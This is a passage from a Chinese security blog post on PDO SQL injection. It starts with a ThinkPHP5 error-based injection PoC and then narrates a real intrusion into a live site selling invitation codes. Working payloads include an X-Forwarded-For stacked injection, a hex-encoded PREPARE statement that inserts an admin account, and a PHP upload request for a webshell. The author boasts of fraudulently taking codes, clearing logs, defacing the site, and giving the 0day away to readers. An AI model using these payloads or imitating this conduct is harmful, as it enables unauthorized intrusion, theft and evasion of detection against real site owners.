            $zone = implode(&#39;,&#39;, $this-&gt;parseValue($value, $field));
        &#125;
        $whereStr .= $key . &#39; &#39; . $exp . &#39; (&#39; . (empty($zone) ? &quot;&#39;&#39;&quot; : $zone) . &#39;)&#39;;
    &#125;
</code></pre>
<p>可见，<code>$bindName</code>在前边进行了一次检测，正常来说是不会出现漏洞的。但如果<code>$value</code>是一个数组的情况下，这里会遍历<code>$value</code>，并将<code>$k</code>拼接进<code>$bindName</code>。</p>
<p>也就是说，我们控制了预编译SQL语句中的键名，也就说我们控制了预编译的SQL语句，这理论上是一个SQL注入漏洞。那么，为什么原文中说测试SQL注入失败呢？</p>
<p>这就是涉及到预编译的执行过程了。通常，PDO预编译执行过程分三步：</p>
<ol>
<li><code>prepare($SQL)</code> 编译SQL语句</li>
<li><code>bindValue($param, $value)</code> 将value绑定到param的位置上</li>
<li><code>execute()</code> 执行</li>
</ol>
<p>这个漏洞实际上就是控制了第二步的<code>$param</code>变量，这个变量如果是一个SQL语句的话，那么在第二步的时候是会抛出错误的：</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2017/07/04/d6c994da-94af-4fef-a6c6-584de29f5929.png"><img src="https://www.leavesongs.com/media/attachment/2017/07/04/d6c994da-94af-4fef-a6c6-584de29f5929.cccfdc6225bf.png" alt="sp170704_025805.png"></a></p>
<p>所以，这个错误“似乎”导致整个过程执行不到第三步，也就没法进行注入了。</p>
<p>但实际上，在预编译的时候，也就是第一步即可利用。我们可以做有一个实验。编写如下代码：</p>
<pre><code class="PHP">&lt;?php
$params = [
    PDO::ATTR_ERRMODE           =&gt; PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_EMULATE_PREPARES  =&gt; false,
];

$db = new PDO(&#39;mysql:dbname=cat;host=127.0.0.1;&#39;, &#39;root&#39;, &#39;root&#39;, $params);

try &#123;
    $link = $db-&gt;prepare(&#39;SELECT * FROM table2 WHERE id in (:where_id, updatexml(0,concat(0xa,user()),0))&#39;);
&#125; catch (\PDOException $e) &#123;
    var_dump($e);
&#125;
</code></pre>
<p>执行发现，虽然我只调用了prepare函数，但原SQL语句中的报错已经成功执行：</p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2017/07/04/52d04bac-33d8-4c8e-be6c-5ed5878fa387.png"><img src="https://www.leavesongs.com/media/attachment/2017/07/04/52d04bac-33d8-4c8e-be6c-5ed5878fa387.f4586aaea04f.png" alt="sp170704_032524.png"></a></p>
<p>究其原因，是因为我这里设置了<code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code>。</p>
<p>这个选项涉及到PDO的“预处理”机制：因为不是所有数据库驱动都支持SQL预编译，所以PDO存在“模拟预处理机制”。如果说开启了模拟预处理，那么PDO内部会模拟参数绑定的过程，SQL语句是在最后<code>execute()</code>的时候才发送给数据库执行；如果我这里设置了<code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code>，那么PDO不会模拟预处理，参数化绑定的整个过程都是和Mysql交互进行的。</p>
<p>非模拟预处理的情况下，参数化绑定过程分两步：第一步是prepare阶段，发送带有占位符的sql语句到mysql服务器（parsing-&gt;resolution），第二步是多次发送占位符参数给mysql服务器进行执行（多次执行optimization-&gt;execution）。</p>
<p>这时，假设在第一步执行<code>prepare($SQL)</code>的时候我的SQL语句就出现错误了，那么就会直接由mysql那边抛出异常，不会再执行第二步。我们看看ThinkPHP5的默认配置：</p>
<pre><code class="php">...
// PDO连接参数
protected $params = [
    PDO::ATTR_CASE              =&gt; PDO::CASE_NATURAL,
    PDO::ATTR_ERRMODE           =&gt; PDO::ERRMODE_EXCEPTION,
    PDO::ATTR_ORACLE_NULLS      =&gt; PDO::NULL_NATURAL,
    PDO::ATTR_STRINGIFY_FETCHES =&gt; false,
    PDO::ATTR_EMULATE_PREPARES  =&gt; false,
];
...
</code></pre>
<p>可见，这里的确设置了<code>PDO::ATTR_EMULATE_PREPARES =&gt; false</code>。所以，终上所述，我构造如下POC，即可利用报错注入，获取user()信息：</p>
<p><a target="_blank" rel="noopener" href="http://localhost/thinkphp5/public/index.php?ids%5B0,updatexml(0,concat(0xa,user()),0)%5D=1231">http://localhost/thinkphp5/public/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1231</a></p>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/media/attachment/2017/07/04/2d22af8c-04ec-4b7d-9fb3-0709ae5c4ab0.png"><img src="https://www.leavesongs.com/media/attachment/2017/07/04/2d22af8c-04ec-4b7d-9fb3-0709ae5c4ab0.679dfef54084.png" alt="sp170704_021313.png"></a></p>
<p>但是，如果你将user()改成一个子查询语句，那么结果又会爆出<code>Invalid parameter number: parameter was not defined</code>的错误。</p>
<p>因为没有过多研究，说一下我猜测：预编译的确是mysql服务端进行的，但是预编译的过程是不接触数据的 ，也就是说不会从表中将真实数据取出来，所以使用子查询的情况下不会触发报错；虽然预编译的过程不接触数据，但类似user()这样的数据库函数的值还是将会编译进SQL语句，所以这里执行并爆了出来。</p>
<h2 id="0x05-实战案例-从cl社区激活码到Git-2000-Star项目0day"><a href="#0x05-实战案例-从cl社区激活码到Git-2000-Star项目0day" class="headerlink" title="0x05 实战案例-从cl社区激活码到Git 2000+ Star项目0day"></a>0x05 实战案例-从cl社区激活码到Git 2000+ Star项目0day</h2><h4 id="5-1-起因"><a href="#5-1-起因" class="headerlink" title="5.1 起因"></a>5.1 起因</h4><p>挖SRC，做项目做的心生烦闷，前几日忍不住在家看1024(cl)社区，越看越来劲，邪火攻心，想搜片看</p>
<p>奈何cl社区一向奉行邀请制，邀请码又很难搞到，可谓让人十分不爽</p>
<p>于是本人去google上找了一个卖1024社区邀请码的站</p>
<p><img src="https://i.loli.net/2021/05/26/s43NVSmyUhGxlP2.png" alt="image-20210526023044553"></p>
<p>88块钱….虽然不算贵，但售卖这种东西本来就是不受法律保护的。作为一个JB小子，怎么可能不动点白嫖心思？</p>
<p>在黑盒测试了一段时间后，发现支付逻辑和前台都没什么安全问题。。难道我真的要花钱买这激活码？？？？</p>
<p>不可能，绝对不可能。</p>
<p>看到网站底部有一个Powered by xxx，呵呵呵，好家伙，不出意外这应该就是这个站用的CMS系统了</p>
<p><img src="https://i.loli.net/2021/05/26/WT9bnVZrH5J1dKu.png" alt="image-20210526023227963"></p>
<p>去Git上一搜，还真有，2000多个Star，作者维护了好几年，也算是个成熟的项目了。</p>
<p>直接把最新版源码下载下来，丢进PHPstorm里开始审计</p>
<h4 id="5-2-从审计思路到PDO导致的前台XFF堆叠注入"><a href="#5-2-从审计思路到PDO导致的前台XFF堆叠注入" class="headerlink" title="5.2 从审计思路到PDO导致的前台XFF堆叠注入"></a>5.2 从审计思路到PDO导致的前台XFF堆叠注入</h4><p>就我个人而言，拿到一套源码，我更喜欢黑白盒相结合；根据前台能访问到的功能点来确定自己审计的目标</p>
<p>简单看了一下整套系统是MVC架构的，使用了PDO，使用有部分过滤规则；后台默认路径是&#x2F;admin</p>
<p>看了一遍前台的功能点，发现在查询订单处路径名很有趣，带有一个&#x2F;query，直接搜一下页面上关键词，跟进入到源码中</p>
<p><img src="https://i.loli.net/2021/05/26/bhl1B4yESK9C6d8.png" alt="image-20210526024734021"></p>
<p>发现了如下的一段code</p>
<p><img src="https://i.loli.net/2021/05/26/sgoDva5h4QYZIGw.png" alt="image-20210526025356848"></p>
<p>PDO均为默认配置，立马想到了堆叠注入</p>
<p>经测试orderid用户可控，全局搜索orderid发现，orderid经函数方法后被处理为纯字符串，没有注入余地，故选择另辟蹊径</p>
<p>后发现ip参数用户同样可控，在调用select方法前没做任何处理。</p>
<p>ip参数调用的是getClientIP方法，我们跟一下getClientIP方法</p>
<p><img src="https://i.loli.net/2021/05/26/hng6kUiuVRmO4aQ.png" alt="image-20210526030817917"></p>
<p>很好理解，就是从常见的http header中获取客户端IP</p>
<p>但是非常高兴，ip参数未做任何处理，我们可以通过构造XFF头来实现堆叠注入</p>
<p>因为有csrf_token的校验，我们必须在查询订单的页面，随便输入个订单号，随后输入正确的验证码，随后查询才有效</p>
<p>随后手动构造XFF头，进行针对PDO的堆叠注入</p>
<p>因为PDO处为双引号进行语句闭合，且属于无回显的堆叠注入</p>
<p>故构造Payload为</p>
<pre><code class="php">X-FORWARDED-For:1&#39;;select sleep(5)#
</code></pre>
<p><img src="https://i.loli.net/2021/05/26/h6Tv1eJEpzQZcKg.png" alt="image-20210526202008945"></p>
<p>延迟了5s，注入成功。</p>
<p>针对这种没回显的堆叠注入，盲注太慢，用Dnslog OOB又太慢，所以选择构造一个添加后台管理员的insert payload</p>
<pre><code class="php">X-FORWARDED-For:1“;insert into t_admin_user values(99,&quot;test@test.test&quot;,&quot;76b1807fc1c914f15588520b0833fbc3&quot;,&quot;78e055&quot;,0);
</code></pre>
<p>但是现实是很残酷的，测试发现，在XFF头中，1”将语句闭合后只要出现了引号或者逗号，就会引发报错，SQL语句无法执行</p>
<p>但是具有一定审计经验的兄弟一定会想到，PDO下Prepare Statement给我们提供了绕过过滤进行注入的沃土</p>
<p>山重水复疑无路，柳暗花明又一村</p>
<h4 id="5-3-Prepare-Statement构造注入语句"><a href="#5-3-Prepare-Statement构造注入语句" class="headerlink" title="5.3 Prepare Statement构造注入语句"></a>5.3 Prepare Statement构造注入语句</h4><p><strong>知识补充 — Prepare Statement写法</strong></p>
<p>MySQL官方将prepare、execute、deallocate统称为PREPARE STATEMENT(预处理)</p>
<p>预制语句的SQL语法基于三个SQL语句：</p>
<pre><code class="sql">prepare stmt_name from preparable_stmt;
execute stmt_name [using @var_name [, @var_name] ...];
&#123;deallocate | drop&#125; prepare stmt_name;
</code></pre>
<p>给出MYSQL中两个简单的demo</p>
<pre><code class="php">set@a=&quot;select user()&quot;;PREPARE a FROM @a;execute a;select sleep(3);#
set@a=0x73656C65637420757365722829;PREPARE a FROM @a;execute a;select sleep(3);#  
//73656C65637420757365722829为select user() 16进制编码后的字符串，前面再加上0x声明这是一个16进制字符串
</code></pre>
<p>Prepare语句在防范SQL注入方面起到了非常大的作用，但是对于SQL注入攻击却也提供了新的手段。</p>
<p>Prepare语句最大的特点就是它可以将16进制串转为语句字符串并执行。如果我们发现了一个存在堆叠注入的场景，但过滤非常严格，便可以使用prepare语句进行绕过。</p>
<p>将我们的insert语句直接hex编码</p>
<p><img src="https://i.loli.net/2021/05/26/ZcOIGsY7y4LeT2w.png" alt="image-20210526200448332"></p>
<p>构造注入语句</p>
<pre><code class="php">X-FORWARDED-For:1&quot;;set@a=0x696E7365727420696E746F20745F61646D696E5F757365722076616C7565732839392C227465737440746573742E74657374222C223736623138303766633163393134663135353838353230623038333366626333222C22373865303535222C30293B;PREPARE a FROM @a;execute a;select sleep(3);#
//sleep用于判断注入是否成功
</code></pre>
<p><img src="https://i.loli.net/2021/05/26/PIcbgu84aAz1OQt.png" alt="image-20210526201816276"></p>
<p>延时3s，注入成功，成功添加了一个账号为<a href="mailto:&#x74;&#101;&#x73;&#x74;&#x40;&#116;&#101;&#x73;&#116;&#x2e;&#x74;&#x65;&#x73;&#x74;">&#x74;&#101;&#x73;&#x74;&#x40;&#116;&#101;&#x73;&#116;&#x2e;&#x74;&#x65;&#x73;&#x74;</a>，密码为123456的后台管理员</p>
<p>直接默认后台路径&#x2F;admin登录后台</p>
<p><img src="https://i.loli.net/2021/05/26/e2Q5VTXWOKxEYpM.png" alt="image-20210526202209072"></p>
<p>前台提交一个cl社区邀请码的订单</p>
<p>后台修改订单状态为确认付款</p>
<p><img src="https://i.loli.net/2021/05/26/hqzsVuaZxb2AnOW.png" alt="image-20210526202525849"></p>
<p>没过一会，邀请码直接到邮箱</p>
<p><img src="https://i.loli.net/2021/05/26/tY5ZA1vmCTyjDMs.png" alt="image-20210526202705629"></p>
<p>以后可以搜片看了</p>
<p><img src="https://i.loli.net/2021/05/26/zMArkUQ8eyBa3C9.png" alt="image-20210526202913110"></p>
<p><img src="https://i.loli.net/2021/05/26/Idr6JSnjLpb5zuF.jpg" alt="ä¿å­ä¿å­å¨é¨ä¿å­ï¼ç»§ç»­ååï¼"></p>
<h4 id="5-4-不讲武德被发现"><a href="#5-4-不讲武德被发现" class="headerlink" title="5.4 不讲武德被发现"></a>5.4 不讲武德被发现</h4><p>在不讲武德，连续薅了几个邀请码，发给朋友后</p>
<p>站长终于发现了</p>
<p><img src="https://i.loli.net/2021/05/26/Rf3U9MGvTdsz86S.png" alt="image-20210526203058983"></p>
<p>八嘎，既然发现了，那就干脆把你的站日下来吧，然后好好擦擦屁股，免得0day被这站长抓走</p>
<p><img src="https://i.loli.net/2021/05/26/TPcSE51ULyY8rBF.jpg" alt="çå°´å°¬å"></p>
<h4 id="5-5-后台Getshell审计-Thanks-17-M78sec"><a href="#5-5-后台Getshell审计-Thanks-17-M78sec" class="headerlink" title="5.5 后台Getshell审计(Thanks 17@M78sec)"></a>5.5 后台Getshell审计(Thanks 17@M78sec)</h4><p>经测试后台的文件上传处鉴权比较严格，没法直接前台getshell</p>
<p>但是后台文件上传处，没有对文件扩展名进行任何过滤，只有一处前端js校验，所以后台getshell直接白给</p>
<p><img src="https://i.loli.net/2021/05/26/SjJafoTI2K6N3lA.png" alt="image-20210526205833957"></p>
<p>文件上传后不会返回上传路径，但上传路径和上传文件的命名规则我们已经了如指掌</p>
<p><img src="https://i.loli.net/2021/05/26/IGrMv2QtBoK31Ey.png" alt="image-20210526204139761"></p>
<p>UPLOAD_PATH定义如下</p>
<pre><code>define(&#39;UPLOAD_PATH&#39;, APP_PATH.&#39;/public/res/upload/&#39;);
</code></pre>
<p>CUR_DATE定义如下</p>
<pre><code>define(&#39;CUR_DATE&#39;, date(&#39;Y-m-d&#39;));
</code></pre>
<p>文件名</p>
<pre><code>$filename=date(&quot;His&quot;);  //小时+分钟+秒
</code></pre>
<p>以我现在21点05分钟为例，输出结果如下</p>
<p><img src="https://i.loli.net/2021/05/26/OYBvblwyEn8hL3J.png" alt="image-20210526210650296"></p>
<p>以2021年5月26日的21点05分44秒为例</p>
<p>完整的文件路径即为</p>
<pre><code>http://www.xxx.com/res/upload/2021-05-26/210444.php
</code></pre>
<p>直接构造表单</p>
<pre><code>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;form action=&quot;http://xxx.top/Admin/products/imgurlajax&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;
    &lt;label for=&quot;file&quot;&gt;File:&lt;/label&gt;
    &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot; /&gt;
    &lt;input type=&quot;text&quot; name=&quot;pid&quot; id=&quot;pid&quot; /&gt;  &lt;--! pid记得自行修改为商品的id(后台选择商品抓包即可获取)--&gt;&lt;/--!&gt;
    &lt;input type=&quot;submit&quot; value=&quot;Upload&quot; /&gt;
&lt;/form&gt;
</code></pre>
<p>同时需要添加Referer: <a target="_blank" rel="noopener" href="http://xxx.top/Admin/products/imgurl/?id=1,%E5%B9%B6%E4%BF%AE%E6%94%B9%E4%B8%8B%E6%96%B9%E7%9A%84">http://xxx.top/Admin/products/imgurl/?id=1,并修改下方的</a></p>
<p>否则会提示“请选择商品id”</p>
<p>最后完整的上传http request如下</p>
<pre><code class="http">POST http://xxx.top/Admin/products/imgurlajax HTTP/1.1
Host: xxxx
Content-Length: 291
Accept: application/json, text/javascript, */*; q=0.01
DNT: 1
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryeSrhtSPGxub0H0eb
Origin: http://47.105.132.207
Referer: http://xxx.top/Admin/products/imgurl/?id=12
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: PHPSESSID=ql4ep5uk8cf9i0rvihrruuilaq
Connection: close

------WebKitFormBoundaryeSrhtSPGxub0H0eb
Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.php&quot;
Content-Type: image/png

&lt;?php
    phpinfo();
------WebKitFormBoundaryeSrhtSPGxub0H0eb
Content-Disposition: form-data; name=&quot;pid&quot;

12
------WebKitFormBoundaryeSrhtSPGxub0H0eb--
</code></pre>
<p>直接上传成功</p>
<p>随后通过burpsuite Intruder来跑一下最后的秒数</p>
<p>毕竟秒数不能拿捏的那么精准</p>
<p><img src="https://i.loli.net/2021/05/26/n8phY6lVJbKaBPd.png" alt="image-20210526212753095"></p>
<p><img src="https://i.loli.net/2021/05/26/VbxMQNrkJFA7mo9.png" alt="image-20210526233749316"></p>
<p>直接拿捏。</p>
<p>把web日志清理掉</p>
<p>然后给public index页面加点乐子</p>
<p><img src="https://i.loli.net/2021/05/26/OgoMxL3fnZaSDwv.png" alt="image-20210526234200023"></p>
<p>传统功夫，点到为止。</p>
<p><img src="https://i.loli.net/2021/05/26/iGZFs84qVx2SjR7.png" alt="image-20210526234615393"></p>
<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>本文主要介绍了通过PDO防范SQL注入的方法和PDO中的注入利用思路，并给大家带来了一个0day实例</p>
<p>你会发现层层抽丝剥茧研究一个模块，并将其中的姿势应用于实战中，是一件很美妙的事情。</p>
<p>相信师傅们是很容易定位到出现本0day的系统的，这个0day就算白送各位师傅的了，希望师傅们也早日成为1024社区会员</p>
<p><img src="https://i.loli.net/2021/05/26/slFQitd5wUKnvj1.jpg" alt="img"></p>
<h2 id="0x07-Refence："><a href="#0x07-Refence：" class="headerlink" title="0x07 Refence："></a>0x07 Refence：</h2><p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html">https://www.leavesongs.com/PENETRATION/thinkphp5-in-sqlinjection.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.51cto.com/u_12332766/2137035">https://blog.51cto.com/u_12332766/2137035</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/3950">https://xz.aliyun.com/t/3950</a></p>
</article><section class="jump-container is-flex is-justify-content-space-between my-6"><!-- em is empty placeholder--><a class="button is-default" href="/2021/08/19/%E9%87%8D%E7%94%9F%E4%B9%8B%E6%88%91%E6%98%AF%E8%B5%8F%E9%87%91%E7%8C%8E%E4%BA%BA-%E4%B8%80-%E8%BD%BB%E6%9D%BEget%E6%9F%90src-soap%E6%B3%A8%E5%85%A5/" title="重生之我是赏金猎人(一)-轻松get某src soap注入"><i class="iconfont icon-prev mr-2 has-text-grey"></i><span class="has-text-weight-semibold">Previous: 重生之我是赏金猎人(一)-轻松get某src soap注入</span></a><a class="button is-default" href="/2021/04/12/2021%E5%B9%B4-hw%E7%BA%A2%E9%98%9F%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90-%E4%B8%89-NimShellcodeLoader/" title="2021年 hw红队样本分析(三) - NimShellcodeLoader"><span class="has-text-weight-semibold">Next: 2021年 hw红队样本分析(三) - NimShellcodeLoader</span><i class="iconfont icon-next ml-2 has-text-grey"></i></a></section><article class="mt-6 comment-container"><script async repo="j0o1ey/j0o1ey.github.io" src="https://utteranc.es/client.js" issue-term="pathname" theme="preferred-color-scheme"></script></article></div></div></main></main><footer class="is-flex is-flex-direction-column is-align-items-center is-flex-shrink-0 is-family-serif"><section class="sns-container"><a title="twitter" target="_blank" rel="noopener nofollow" href="//twitter.com//"><i class="iconfont icon-twitter"></i></a><!-- Github--><a title="github" target="_blank" rel="noopener nofollow" href="//github.com/j0o1ey"><i class="iconfont icon-github"></i></a><!-- Ins--><a title="instagram" target="_blank" rel="noopener nofollow" href="//www.instagram.com//"><i class="iconfont icon-ins"></i></a><!-- RSS--><!-- 知乎--><!-- 领英--><!-- 脸书--><a title="facebook" target="_blank" rel="noopener nofollow" href="//www.facebook.com//"><i class="iconfont icon-tian7_facebook"></i></a></section><p><span>Copyright ©</span><span> J0o1ey 2023</span></p><div class="is-flex is-justify-content-center is-flex-wrap-wrap"><p>Powered by Hexo &verbar;&nbsp;</p><p class="is-flex is-justify-content-center"><a title="Hexo theme author" target="_blank" rel="noopener" href="//github.com/haojen">Theme by Haojen&nbsp;</a></p><div style="margin-top: 2px"><a class="github-button" title="github-button" target="_blank" rel="noopener" href="https://github.com/haojen/hexo-theme-Claudia" data-color-scheme="no-preference: light; light: light; dark: dark;" data-show-count="true"></a></div></div><div><span></span></div></footer><script async defer src="https://buttons.github.io/buttons.js"></script><script src="/js/jquery-3.6.1.min.js"></script><script src="/js/jquery-fancybox.min.js"></script><script src="/js/img_zoom.js"></script><script src="/js/post.js"></script></body></html>